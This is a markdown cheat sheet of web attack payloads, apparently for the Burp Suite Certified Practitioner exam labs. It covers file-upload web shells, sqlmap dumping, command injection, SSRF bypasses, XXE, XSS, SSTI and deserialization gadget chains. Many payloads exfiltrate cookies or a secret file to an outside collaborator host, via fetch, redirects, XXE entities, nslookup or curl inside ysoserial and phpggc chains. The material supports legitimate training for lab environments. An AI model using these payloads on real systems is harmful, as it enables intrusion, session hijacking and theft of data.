# BSCP payloads



# Server Side
## File upload
```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" test_file.jpg  -o polyglot.php
```
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
```php
<?php echo system($_GET['command']); ?>
GET /example/exploit.php?command=whoami HTTP/1.1
```
```
.php5, .shtml
.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
```

## SQL injection
```
sqlmap -u $url --proxy="https://127.0.0.1:8080" --batch -p param -H "Cookie: session=" --dbms PostgreSQL --user-agent random -D public -T users -C email,password --dump
```

## NoSQL injection
```
'"`{
;$Foo}
$Foo \xYZ

'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

## OS Command Injection
```sh
ping -c 10 127.0.0.1
```
```sh
nslookup `whoami`.burp.oastify.com
```

## SSRF
```
127.1
2130706433
017700000001
0x7f000001
```

## XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burp.oastify.com"> ]>
```
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://burp.oastify.com/?c=%file;'>">
```
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
```

# Client Side
## XSS
```js
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
<img src="http://burp.oastify.com?c='+document.cookie+'" />
<img src=0 onerror="window.location='http://burp.oastify.com/c='+document.cookie"/>
```
```js
fetch('https://burp.oastify.com?c='+btoa(document.cookie))
javascript:alert(document.cookie)
eval(atob("BASE64_PAYLOAD - window.location='https://burp.oastify.com/c='+document.cookie"))
```

```js
<script>
document.location=""
</script>
```
```js
<script>
fetch('https://burp.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```



# Advanced
## SSTI
```
${{<%[%'"}}%\.
${7*7}
x{*comment*}y
{{7*7}}
{{7*'7'}}
```


# Advanced
## Insecure Deserialization
```sh
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections2 'curl burp.oastify.com -d @/home/carlos/secret' | gzip | base64 -w 0
```
```sh
java -jar ysoserial-all.jar CommonsCollections2 'curl burp.oastify.com -d @/home/carlos/secret' | gzip | base64 -w 0
```
```sh
./phpggc Symfony/RCE4 exec 'curl burp.oastify.com -d @/home/carlos/secret' | base64 -w 0
```